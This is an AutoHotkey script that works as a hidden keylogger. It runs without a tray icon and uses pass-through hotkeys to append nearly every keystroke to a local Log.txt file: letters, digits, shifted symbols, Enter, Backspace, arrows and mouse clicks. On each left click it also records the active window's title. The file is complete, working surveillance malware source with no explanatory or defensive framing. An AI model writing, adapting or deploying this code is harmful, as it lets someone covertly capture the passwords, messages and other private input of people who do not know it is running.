#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
#SingleInstance Force ; Allow only one running instance of script.
#NoTrayIcon
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
return

Loop,
{
	Input, Var, L1 V
	FileAppend, %Var%, Log.txt
}
return

~q::
	FileAppend, q, Log.txt
return

~w::
	FileAppend, w, Log.txt
return

~e::
	FileAppend, e, Log.txt
return

~r::
	FileAppend, r, Log.txt
return

~t::
	FileAppend, t, Log.txt
return

~y::
	FileAppend, y, Log.txt
return

~u::
	FileAppend, u, Log.txt
return

~i::
	FileAppend, i, Log.txt
return

~o::
	FileAppend, o, Log.txt
return

~p::
	FileAppend, p, Log.txt
return

~a::
	FileAppend, a, Log.txt
return

~s::
	FileAppend, s, Log.txt
return

~d::
	FileAppend, d, Log.txt
return

~f::
	FileAppend, f, Log.txt
return

~g::
	FileAppend, g, Log.txt
return

~h::
	FileAppend, h, Log.txt
return

~j::
	FileAppend, j, Log.txt
return

~k::
	FileAppend, k, Log.txt
return

~l::
	FileAppend, l, Log.txt
return

~z::
	FileAppend, z, Log.txt
return

~x::
	FileAppend, x, Log.txt
return

~c::
	FileAppend, c, Log.txt
return

~v::
	FileAppend, v, Log.txt
return

~b::
	FileAppend, b, Log.txt
return

~n::
	FileAppend, n, Log.txt
return

~m::
	FileAppend, m, Log.txt
return

~0::
	FileAppend, 0, Log.txt
return

~9::
	FileAppend, 9, Log.txt
return

~8::
	FileAppend, 8, Log.txt
return

~7::
	FileAppend, 7, Log.txt
return

~6::
	FileAppend, 6, Log.txt
return

~5::
	FileAppend, 5, Log.txt
return

~4::
	FileAppend, 4, Log.txt
return

~3::
	FileAppend, 3, Log.txt
return

~2::
	FileAppend, 2, Log.txt
return

~1::
	FileAppend, 1, Log.txt
return

~+q::
	FileAppend, Q, Log.txt
return

~+w::
	FileAppend, W, Log.txt
return

~+e::
	FileAppend, E, Log.txt
return

~+r::
	FileAppend, R, Log.txt
return

~+t::
	FileAppend, T, Log.txt
return

~+y::
	FileAppend, Y, Log.txt
return

~+u::
	FileAppend, U, Log.txt
return

~+i::
	FileAppend, I, Log.txt
return

~+o::
	FileAppend, O, Log.txt
return

~+p::
	FileAppend, P, Log.txt
return

~+a::
	FileAppend, A, Log.txt
return

~+s::
	FileAppend, S, Log.txt
return

~+d::
	FileAppend, D, Log.txt
return

~+f::
	FileAppend, F, Log.txt
return

~+g::
	FileAppend, G, Log.txt
return

~+h::
	FileAppend, H, Log.txt
return

~+j::
	FileAppend, J, Log.txt
return

~+k::
	FileAppend, K, Log.txt
return

~+l::
	FileAppend, L, Log.txt
return

~+z::
	FileAppend, Z, Log.txt
return

~+x::
	FileAppend, X, Log.txt
return

~+c::
	FileAppend, C, Log.txt
return

~+v::
	FileAppend, V, Log.txt
return

~+b::
	FileAppend, B, Log.txt
return

~+n::
	FileAppend, N, Log.txt
return

~+m::
	FileAppend, M, Log.txt
return

~+0::
	FileAppend, {)}, Log.txt
return

~+9::
	FileAppend, {(}, Log.txt
return

~+8::
	FileAppend, {*}, Log.txt
return

~+7::
	FileAppend, {&}, Log.txt
return

~+6::
	FileAppend, {`^}, Log.txt
return

~+5::
	FileAppend, {`%}, Log.txt
return

~+4::
	FileAppend, {`$}, Log.txt
return

~+3::
	FileAppend, {`#}, Log.txt
return

~+2::
	FileAppend, {@}, Log.txt
return

~+1::
	FileAppend, {`!}, Log.txt
return

~/::
	FileAppend, {/}, Log.txt
return

~+/::
	FileAppend, {?}, Log.txt
return

~,::
	FileAppend, {`,}, Log.txt
return

~+,::
	FileAppend, {<}, Log.txt
return

~.::
	FileAppend, {.}, Log.txt
return

~+.::
	FileAppend, {>}, Log.txt
return

~=::
	FileAppend, {=}, Log.txt
return

~+=::
	FileAppend, {+}, Log.txt
return

~`::
	FileAppend, {`}, Log.txt
return

~+`::
	FileAppend, {~}, Log.txt
return

~Space::
	FileAppend, ` , Log.txt
return

~Backspace::
	FileAppend, [<-], Log.txt
return

~Enter::
	FileAppend, `r`n, Log.txt
return

~LButton::
	WinGetActiveTitle, Title
	FileAppend, Current Window| %Title% `r`n, Log.txt
	FileAppend, {LeftMouseClick} `r`n, Log.txt
return

~Control::
	FileAppend, {KeyboardCtrl}, Log.txt
return

~Up::
	FileAppend, {KeyboardUP}, Log.txt
return

~Down::
	FileAppend, {KeyboardDOWN}, Log.txt
return

~Left::
	FileAppend, {KeyboardLEFT}, Log.txt
return

~Right::
	FileAppend, {KeyboardRIGHT}, Log.txt
return

~RButton::
	FileAppend, {RightMouseClick} `r`n, Log.txt
return

~Escape::
	FileAppend, {KeyboardESC}, Log.txt
return

~'::
	FileAppend, ', Log.txt
return

~+'::
	FileAppend, ", Log.txt
return

~-::
	FileAppend, -, Log.txt
return

~+-::
	FileAppend, _, Log.txt
return

~CapsLock::
	FileAppend, {CapsLock}, Log.txt
return

^+Esc::
return